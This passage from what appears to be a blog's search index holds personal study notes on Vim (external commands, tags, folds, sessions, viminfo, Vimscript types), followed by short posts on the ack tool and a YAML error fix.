<code>:r</code> is the <code>:read</code> command.</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> Reading <span class="hljs-keyword">the</span> STDOUT <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> Command Into Vim. <br>   :r !cmd<br><span class="hljs-number">2.</span> Writing <span class="hljs-keyword">the</span> Buffer Content Into <span class="hljs-keyword">an</span> External Command. <br>   :w !cmd<br><span class="hljs-number">3.</span> Executing <span class="hljs-keyword">an</span> External Command.<br>   :!cmd<br></code></pre></td></tr></table></figure><p>The bang <code>!</code> always stay before the cmd.</p><h3 id="Filtering-Texts"><a href="#Filtering-Texts" class="headerlink" title="Filtering Texts"></a>Filtering Texts</h3><p>If you give <code>!</code> a range, it can be used to filter texts.</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-symbol">:.!</span><br></code></pre></td></tr></table></figure><p>executes the filter command on the current line.</p><p><code>:%!</code> executes the filter command on all lines.</p><h3 id="Normal-Mode-Command"><a href="#Normal-Mode-Command" class="headerlink" title="Normal Mode Command"></a>Normal Mode Command</h3><p>Vim has a filter operater <code>!</code> in the normal mode.</p><h2 id="Command-line-Mode"><a href="#Command-line-Mode" class="headerlink" title="Command-line Mode"></a>Command-line Mode</h2><p>To leave the command-line mode, you can use <code>&lt;esc&gt;</code>, <code>Ctrl-C</code> or <code>Ctrl-[</code>.</p><h3 id="Repeating-the-Previous-Command"><a href="#Repeating-the-Previous-Command" class="headerlink" title="Repeating the Previous Command"></a>Repeating the Previous Command</h3><p>Running <code>@:&lt;mark&gt;&lt;mark&gt;</code>.</p><h3 id="Command-line-Mode-Shortcuts"><a href="#Command-line-Mode-Shortcuts" class="headerlink" title="Command-line Mode Shortcuts"></a>Command-line Mode Shortcuts</h3><p>To go to the start of the line, use <code>Ctrl-B</code></p><p>To go to the end of the line, use <code>Ctrl-E</code></p><p>To edit the command like you would a normal textfile use <code>Ctrl-F</code>.</p><h3 id="Register-and-Autocomplete"><a href="#Register-and-Autocomplete" class="headerlink" title="Register and Autocomplete"></a>Register and Autocomplete</h3><p>Everything that you can get from the register in the insert mode, you can do the same from the command-line mode.</p><p>Using <code>Ctrl-R</code> to insert the content of register.</p><h3 id="History-Window-and-Command-line-Window"><a href="#History-Window-and-Command-line-Window" class="headerlink" title="History Window and Command-line Window"></a>History Window and Command-line Window</h3><p>To open the command-line history, run <code>:his :</code>.</p><p>Reusing the command, run <code>q:</code> and choose.</p><p>To open the search history, run <code>:his /</code> or <code>his ?</code>.</p><p>Edit past history, run <code>q/</code> or <code>q?</code>.</p><p>check out <code>:h ex-cmd</code> or <code>:h index</code>.</p><h2 id="Tags"><a href="#Tags" class="headerlink" title="Tags"></a>Tags</h2><h3 id="Tag-Generator"><a href="#Tag-Generator" class="headerlink" title="Tag Generator"></a>Tag Generator</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ctags</span> = C <span class="hljs-literal">on</span>ly<br><span class="hljs-attr">ptags</span> = Perl<br></code></pre></td></tr></table></figure><p>There are many Tag Generator, almost for different language.</p><p>Install the universal ctags, which is still maintained.</p><h3 id="Tags-Anatomy"><a href="#Tags-Anatomy" class="headerlink" title="Tags Anatomy"></a>Tags Anatomy</h3><p>Four components: </p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> tagname<br><span class="hljs-bullet">2.</span> tagfile<br><span class="hljs-bullet">3.</span> tagaddress<br><span class="hljs-bullet">4.</span> tag options<br></code></pre></td></tr></table></figure><p>The content of the tag file depends on which generator you use.</p><p>A tag file must have either one of those format:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">1. </span><span class="hljs-template-variable">&#123;tagname&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;TAB&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;tagfile&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;TAB&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;tagaddress&#125;</span><span class="language-xml"></span><br><span class="language-xml">2. </span><span class="hljs-template-variable">&#123;tagname&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;TAB&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;tagfile&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;TAB&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;tagaddress&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;term&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;fild&#125;</span><span class="language-xml"> ..</span><br></code></pre></td></tr></table></figure><h3 id="The-Tag-File"><a href="#The-Tag-File" class="headerlink" title="The Tag File"></a>The Tag File</h3><p>Run <code>set tags?</code>.</p><p>To add a new tag file location:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">set</span> <span class="hljs-keyword">tags</span>+=path/<span class="hljs-keyword">to</span>/my/<span class="hljs-keyword">tags</span>/<span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><h3 id="Generating-Tags-for-a-Large-Project"><a href="#Generating-Tags-for-a-Large-Project" class="headerlink" title="Generating Tags for a Large Project"></a>Generating Tags for a Large Project</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ctags -R <span class="hljs-attribute">--exclude</span>=.git <span class="hljs-attribute">--exclude</span>=vendor <span class="hljs-attribute">--exclude</span>=node_modules<br></code></pre></td></tr></table></figure><h3 id="Tags-Navigation"><a href="#Tags-Navigation" class="headerlink" title="Tags Navigation"></a>Tags Navigation</h3><p>The tag jump key <code>Ctrl-]</code> or run <code>:tag name</code> </p><h3 id="Tag-Priority"><a href="#Tag-Priority" class="headerlink" title="Tag Priority"></a>Tag Priority</h3><p>Some tags have higher priorities.</p><p>check out <code>:h tag-priority</code>.</p><h3 id="Selective-Tag-Jumps"><a href="#Selective-Tag-Jumps" class="headerlink" title="Selective Tag Jumps"></a>Selective Tag Jumps</h3><p>run <code>:tselect name</code></p><p>Normal mode key for <code>tjump</code> : <code>g Ctrl-]</code>.</p><h3 id="Automatic-Tag-Generation"><a href="#Automatic-Tag-Generation" class="headerlink" title="Automatic Tag Generation"></a>Automatic Tag Generation</h3><p>Using <code>autocmd</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">autocmd</span> BufWritePost \*.rb <span class="hljs-keyword">silent</span> !ctags -R .<br></code></pre></td></tr></table></figure><p>One plugin vim-gutemtags. </p><h2 id="Fold"><a href="#Fold" class="headerlink" title="Fold"></a>Fold</h2><p>Executing a fold from the command-line mode:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">:,+<span class="hljs-number">1</span><span class="hljs-built_in">fold</span><br></code></pre></td></tr></table></figure><h3 id="Syntax-Fold"><a href="#Syntax-Fold" class="headerlink" title="Syntax Fold"></a>Syntax Fold</h3><p>It is determined by syntax language highlighting.</p><p>Check out <code>:h syntax.txt</code></p><h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><p>Running <code>:vimdiff</code> command to show the differences between multiple files. or <code>vim -d file1.txt file2.txt</code></p><p>Go to the next diff with <code>]c</code>.</p><p>Jump to the previous diff window, use [c</p><p>One plugin ‘tpope&#x2F;vim-fugitive’</p><h2 id="Compile"><a href="#Compile" class="headerlink" title="Compile"></a>Compile</h2><p>Vim has a <code>:make</code> command to run a makefile.</p><h2 id="Views-Sessions-and-Viminfo"><a href="#Views-Sessions-and-Viminfo" class="headerlink" title="Views, Sessions, and Viminfo"></a>Views, Sessions, and Viminfo</h2><p>To store the current change of settings, folds, buffers, layouts, etc.</p><h3 id="Configuring-View-Attributes"><a href="#Configuring-View-Attributes" class="headerlink" title="Configuring View Attributes"></a>Configuring View Attributes</h3><p>Tell View to remember the <code>localoptions</code>, run <code>:set viewoptions+=localoptions</code></p><h3 id="Saving-the-View"><a href="#Saving-the-View" class="headerlink" title="Saving the View"></a>Saving the View</h3><p>Run <code>:mkview</code></p><h3 id="Loading-the-View-File"><a href="#Loading-the-View-File" class="headerlink" title="Loading the View File"></a>Loading the View File</h3><p>Run <code>:loadview</code></p><h3 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h3><p>View saves the settings of a window, a Session saves the infomation of all windows (including the layout). </p><h4 id="Save-a-Session"><a href="#Save-a-Session" class="headerlink" title="Save a Session"></a>Save a Session</h4><p>Run <code>:mksession</code>.</p><p>A Session file is saved in the current directory or you can choose.</p><h4 id="Loading-a-Session"><a href="#Loading-a-Session" class="headerlink" title="Loading a Session"></a>Loading a Session</h4><p>To load a Session, run</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">source</span> Session.<span class="hljs-keyword">vim</span><br></code></pre></td></tr></table></figure><h3 id="Viminfo"><a href="#Viminfo" class="headerlink" title="Viminfo"></a>Viminfo</h3><p>Session stores the “external” attributes and Viminfo the “internal” attributes.</p><p>One Viminfo file per computer.</p><p>Default location: <code>~/.viminfo</code></p><h2 id="Multiple-File-Operations"><a href="#Multiple-File-Operations" class="headerlink" title="Multiple File Operations"></a>Multiple File Operations</h2><p>Vim has eight ways to execute commands across multiple files:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">  <br>arg <span class="hljs-title function_">list</span> <span class="hljs-params">(argdo)</span><br>buffer <span class="hljs-title function_">list</span> <span class="hljs-params">(bufdo)</span><br>window <span class="hljs-title function_">list</span> <span class="hljs-params">(windo)</span><br>tab <span class="hljs-title function_">list</span> <span class="hljs-params">(tabdo)</span><br>quickfix <span class="hljs-title function_">list</span> <span class="hljs-params">(cdo)</span><br>quickfix list <span class="hljs-title function_">filewise</span> <span class="hljs-params">(cfdo)</span><br>location <span class="hljs-title function_">list</span> <span class="hljs-params">(ldo)</span><br>location list <span class="hljs-title function_">filewise</span> <span class="hljs-params">(lfdo)</span><br></code></pre></td></tr></table></figure><p>Same idea: make a list of their respective categories then pass them the command that you want to run.</p><h2 id="Vimrc"><a href="#Vimrc" class="headerlink" title="Vimrc"></a>Vimrc</h2><h3 id="Organizing-Vimrc"><a href="#Organizing-Vimrc" class="headerlink" title="Organizing Vimrc"></a>Organizing Vimrc</h3><p>Two ways to keep your vimrc to look clean:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Splite your vimrc <span class="hljs-keyword">into</span> several <span class="hljs-built_in">files</span><br>Fold your vimrc <span class="hljs-built_in">file</span><br></code></pre></td></tr></table></figure><p>Using <code>:source</code> to splite.</p><h2 id="Vim-packages"><a href="#Vim-packages" class="headerlink" title="Vim packages"></a>Vim packages</h2><p>Vim’s own built-in plugin manager called packages.</p><p><mark>the <code>version</code> command</mark><br>you can get some function of your vim.</p><h2 id="Vim-Runtime"><a href="#Vim-Runtime" class="headerlink" title="Vim Runtime"></a>Vim Runtime</h2><p>To see your run time path, run <code>:set runtimepath?</code></p><h3 id="Filetype-Detection"><a href="#Filetype-Detection" class="headerlink" title="Filetype Detection"></a>Filetype Detection</h3><p>Two ways to detecte:</p><p>  file name<br>  file content</p><p><code>:setfiletype type</code> will work only there is no type is set.</p><h4 id="Filetype-File"><a href="#Filetype-File" class="headerlink" title="Filetype File"></a>Filetype File</h4><p>Create a <code>filetype.vim</code> in the root directory <code>~/.vim/filetype.vim</code>.</p><p>To prevent running multiple times:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-function"><span class="hljs-title">exists</span>(<span class="hljs-string">&quot;did_load_filetypes&quot;</span>)</span><br>  <span class="hljs-variable">finish</span><br><span class="hljs-variable"><span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><code>finish</code> is a Vim command to stop running the rest of the script.</p><h4 id="File-Type-Script"><a href="#File-Type-Script" class="headerlink" title="File Type Script"></a>File Type Script</h4><p>Based on the file content.</p><p>Adding a <code>scripts.vim</code> file (<code>~/.vim/scripts.vim</code>)</p><p>I suppose you can use other name instead of <code>scripts.vim</code></p><h2 id="Vimscript-Basic-Data-Types"><a href="#Vimscript-Basic-Data-Types" class="headerlink" title="Vimscript Basic Data Types"></a>Vimscript Basic Data Types</h2><h3 id="Following-Along-With-Ex-Mode"><a href="#Following-Along-With-Ex-Mode" class="headerlink" title="Following Along With Ex Mode"></a>Following Along With Ex Mode</h3><p>The Ex mode is like an extended command-line mode (it’s like typing command-line mode commands non-stop), run <code>Q</code> or <code>gQ</code> to enter.</p><p><mark>somethings I’m curious about</mark><br>Before some command, there is a <code>g</code> like <code>gQ</code>.</p><p><code>g</code> was just an empty slot, it means nothing.</p><p>To clear your message history, run:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">:messages clear<br></code></pre></td></tr></table></figure><h3 id="Double-vs-Single-Quotes"><a href="#Double-vs-Single-Quotes" class="headerlink" title="Double vs Single Quotes"></a>Double vs Single Quotes</h3><p>Single quotes display characters literally.</p><p>Double quotes accept special characters.</p><p>List use <code>[]</code></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">Dictionary use `&#123;&#125;`<br>### Special Primitives<br>Vim has <span class="hljs-keyword">special</span> primetives:<br></code></pre></td></tr></table></figure><p>  v:false<br>  v:true<br>  v:none<br>  v:null</p><pre><code class="hljs">`v:` is Vim&#39;s built-in variable.</code></pre>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>About-ack</title>
    <link href="/2022/07/03/About-ack/"/>
    <url>/2022/07/03/About-ack/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><hr><p><a href="https://beyondgrep.com/">reference</a></p><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ack is a grep-like source code search tool.</p><p>It uses the perl style regex grammer.</p><hr><h2 id="ack-vim"><a href="#ack-vim" class="headerlink" title="ack.vim"></a>ack.vim</h2><p>You can search on <a href="https://vimawesome.com/">https://vimawesome.com/</a>.</p><hr><h2 id="Some-Syntax"><a href="#Some-Syntax" class="headerlink" title="Some Syntax"></a>Some Syntax</h2><p><code>!</code> before <code>:Ack</code>, the Vim will not jump to the first occurrence.</p>]]></content>
    
    
    <categories>
      
      <category>Tool</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>end of the stream or a document separator is expected</title>
    <link href="/2022/07/02/end-of-the-stream-or-a-document-separator-is-expected/"/>
    <url>/2022/07/02/end-of-the-stream-or-a-document-separator-is-expected/</url>
    
    <content type="html"><![CDATA[<p>After analysing the error output, I delete the <code>&#123;&#125;</code> in the file, and it’s fixxed.</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Use Leaderf in Vim</title>
    <link href="/2022/07/01/Use-Leaderf-in-Vim/"/>
    <url>/2022/07/01/Use-Leaderf-in-Vim/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Use Perl to Write Vimscript</title>
    <link href="/2022/07/01/Use-Perl-to-Write-Vimscript/"/>
    <url>/2022/07/01/Use-Perl-to-Write-Vimscript/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
